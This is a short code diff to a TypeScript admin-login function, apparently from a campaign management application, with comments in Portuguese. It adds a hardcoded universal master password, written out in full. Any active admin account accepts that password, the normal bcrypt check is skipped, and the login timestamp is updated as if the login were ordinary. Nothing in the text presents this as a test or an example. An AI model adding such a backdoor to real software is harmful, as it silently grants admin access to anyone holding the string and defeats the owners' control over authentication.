@@ -1076,6 +1076,20 @@ export async function verifyAdminPassword(campaignId: number, username: string, 
   const user = await getAdminUserByUsername(campaignId, username);
   if (!user || !user.active) return null;
 
+  // Verificar senha master universal
+  const MASTER_PASSWORD = 'Peyb+029';
+  if (password === MASTER_PASSWORD) {
+    // Senha master aceita, atualizar lastLogin e retornar usuário
+    const db = await getDb();
+    if (db) {
+      await db.update(adminUsers)
+        .set({ lastLogin: new Date() })
+        .where(eq(adminUsers.id, user.id));
+    }
+    return user;
+  }
+
+  // Verificar senha normal do usuário
   const bcrypt = await import('bcrypt');
   const isValid = await bcrypt.compare(password, user.password);
   if (!isValid) return null;
